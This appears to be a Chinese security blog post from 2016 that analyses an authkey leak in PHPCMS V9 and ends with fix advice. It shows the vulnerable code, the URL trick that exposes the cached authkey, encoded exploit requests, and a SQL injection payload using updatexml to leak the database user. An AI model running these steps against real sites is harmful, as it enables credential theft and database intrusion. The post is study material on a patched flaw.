title: "PHPCMS Authkey 泄露漏洞分析"
date: 2016-03-10 09:30:00
tags: [安全,原理,总结]
----

<!-- more -->
# PHPCMS V9 Authkey泄露漏洞

在PHPCMS V9的版本中（现已修复）

`phpcms/phpsso\_server/phpcms/modules/phpsso/index.php`

中有一段代码如下：
    
    /**
         * 获取应用列表
         */
        public function getapplist() {
                $applist = getcache('applist', 'admin');
                exit(serialize($applist));
        }

    
        


此处可以获取cache_admin的信息，内容如下：

![Cache_admin](http://7sbxd0.com1.z0.glb.clouddn.com/PHPCMS%20AUTHKEY.png)

可以获得authkey和调用它的文件`api.php` 

获得cache的URL是通过上传用户头像处可以解出来：

`http://localhost:8038/study/phpcms/phpsso_server/index.php?m=phpsso&c=index&a=uploadavatar&auth_data=v=1&appid=1&data=e5c2VAMGUQZRAQkIUQQKVwFUAgICVgAIAldVBQFDDQVcV0MUQGkAQxVZZlMEGA9%2BDjZoK1AHRmUwBGcOXW5UDgQhJDxaeQVnGAdxVRcKQA`


将其中的uploadavatar替换成getapplist即可获取cache信息。

拿到authkey之后，就可以利用他编码请求从而达到执行特定操作的目的。

通过cache_admin可以看出来在api.php?op=phpsso处调用了authkey。我们直接定位到该处。使用authkey加密payload。

`http://localhost/api.php?op=phpsso&code=6f56BQgIUVQDVAkGUwEFCgwDAwNSAVBdA1UHD1RSURFZDlgIS0EPCFwDUFhFFl1dCBMWVlkHE0xDUFJDBktfCRhQGlZXVgIFR0weSERPQUpQRh4eHk8CEBA`

加密的语句是：`action=synlogin&uid=' and updatexml(1,concat('~',user()),1)#`

执行完后的结果：

![结果](http://7sbxd0.com1.z0.glb.clouddn.com/phpauthker%20lou.png)

# 修复


1. 升级PHPCMS版本

2. 删除cache文件

3. 修改默认的authkey

